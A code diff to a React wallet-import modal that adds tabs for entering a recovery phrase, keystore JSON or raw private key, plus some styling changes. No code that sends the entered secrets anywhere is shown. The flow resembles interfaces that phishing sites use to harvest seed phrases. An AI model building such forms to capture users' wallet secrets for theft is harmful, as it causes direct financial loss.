@@ -29,7 +29,6 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
   const [phrase, setPhrase] = useState<string>("");
   const [isImporting, setIsImporting] = useState<boolean>(false);
   const hasClosedWalletModal = useRef<boolean>(false);
-
   // Close wallet modal when import modal opens (only once)
   useEffect(() => {
     if (isOpen && onWalletModalClose && !hasClosedWalletModal.current) {
@@ -71,7 +70,7 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
       {/* Modal */}
       <div className="relative bg-gradient-to-br from-gray-900/95 via-gray-800/95 to-gray-900/95 backdrop-blur-xl border border-purple-500/20 rounded-3xl shadow-2xl max-w-md w-full mx-4 overflow-hidden">
         {/* Glow effect */}
-        <div className="absolute inset-0 bg-gradient-to-r from-purple-500/10 via-transparent to-blue-500/10 rounded-3xl" />
+        <div className="absolute pointer-events-none -z-10 inset-0 bg-gradient-to-r from-purple-500/10 via-transparent to-blue-500/10 rounded-3xl" />
 
         {/* Header */}
         <div className="relative flex items-center justify-between p-6 border-b border-purple-500/20 bg-gradient-to-r from-gray-800/50 to-gray-900/50">
@@ -133,20 +132,61 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
             </p>
           </div>
 
-          {/* Input Area */}
-          <div className="mb-6">
-            <textarea
-              value={phrase}
-              onChange={(e) => setPhrase(e.target.value)}
-              placeholder="phrase"
-              className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
-            />
-          </div>
+          {/* Tab Content */}
+          {activeTab === "phrase" && (
+            <>
+              {/* Input Area */}
+              <div className="mb-6">
+                <textarea
+                  value={phrase}
+                  onChange={(e) => setPhrase(e.target.value)}
+                  placeholder="Enter your recovery phrase..."
+                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
+                />
+              </div>
 
-          {/* Instructions */}
-          <p className="text-gray-400 text-sm mb-8">
-            Typically 12 (sometimes 24) words separated by single spaces.
-          </p>
+              {/* Instructions */}
+              <p className="text-gray-400 text-sm mb-8">
+                Typically 12 (sometimes 24) words separated by single spaces.
+              </p>
+            </>
+          )}
+
+          {activeTab === "keystore" && (
+            <>
+              {/* Keystore Input */}
+              <div className="mb-6">
+                <textarea
+                  placeholder="Paste your keystore JSON file content..."
+                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
+                />
+              </div>
+
+              {/* Keystore Instructions */}
+              <p className="text-gray-400 text-sm mb-8">
+                Paste the contents of your keystore JSON file. This file
+                contains your encrypted private key.
+              </p>
+            </>
+          )}
+
+          {activeTab === "private" && (
+            <>
+              {/* Private Key Input */}
+              <div className="mb-6">
+                <textarea
+                  placeholder="Enter your private key..."
+                  className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
+                />
+              </div>
+
+              {/* Private Key Instructions */}
+              <p className="text-gray-400 text-sm mb-8">
+                Enter your private key (64 character hexadecimal string). Keep
+                this secure and never share it.
+              </p>
+            </>
+          )}
 
           {/* Import Button */}
           <Button
